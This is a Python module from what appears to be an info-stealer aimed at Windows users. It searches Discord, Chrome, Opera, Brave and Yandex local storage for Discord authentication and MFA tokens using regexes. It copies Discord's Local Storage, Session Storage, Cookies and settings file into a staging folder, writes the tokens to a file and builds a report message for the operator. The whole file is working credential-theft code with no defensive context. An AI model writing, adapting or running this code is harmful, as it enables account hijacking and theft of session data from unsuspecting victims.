from os import sep,environ,makedirs,path,listdir
from shutil import copy2,copytree
from re import findall
from manager.logger import Log
from preferences.config import config


def GetToken(Directory):    
    Directory += '\\Local Storage\\leveldb'
    Tokens = []
    try:
        for FileName in listdir(Directory):
            if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for Token in findall(regex, line):
                        Tokens.append(Token)
    except Exception as e:
        Log(f"DS GetToken ---> {e}")
    return Tokens


def TokenGrabber(local, roaming, pathtofile):
    Directories = {
        'Discord': roaming + '\\Discord',
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }

    try:
        for Discord, Directory in Directories.items():
            if path.exists(Directory):
                Tokens = GetToken(Directory)
                if len(Tokens) > 0:
                    f = open(f'{pathtofile}\\Messengers\\Discord\\TokenGrabber.txt', 'w', encoding='utf-8')
                    f.write("Tokens:\n")
                    for Token in Tokens:
                        f.write(f"{Discord}: \"{Token}\"\n")
                    f.close()
    except Exception as e:
        Log(f"DS TokenGrabber ---> {e}")




def Discord():
    msgInfo = ""
    msgInfo+="\n\n\n<b>📬Messagers📬</b>"
    dirs = [
        r'Local Storage\leveldb',
        r'Session Storage'
        ]
    files= [
        r"Network\Cookies",
        r"settings.json"
    ]
    try:
        Log("===========Messagers===========")
        local = environ['USERPROFILE'] + sep + r'AppData\Local'
        roaming = environ['USERPROFILE'] + sep + r'AppData\Roaming'
        user = environ['USERPROFILE']
        pathtofile = f'{user}\\{config.pathToLogs}'
        makedirs(f'{pathtofile}\\Messengers\\Discord', exist_ok=True)
        for dir in dirs:
            try:
                copytree(fr"{roaming}\discord\{dir}", f"{pathtofile}\\Messengers\\Discord\\{dir}")
            except Exception as e:
                Log(f"{dir} DS dirs ---> {e}")
        for file in files:
            try:
                copy2(fr"{roaming}\discord\{file}",f"{pathtofile}\\Messengers\\Discord")
            except Exception as e:
                Log(f"{file} DS files ---> {e}")
        msgInfo+="\n∟📨Discord"
        TokenGrabber(local, roaming, pathtofile)
        return msgInfo
    except Exception as e :
        Log(f"DS global ---> {e}")
        return msgInfo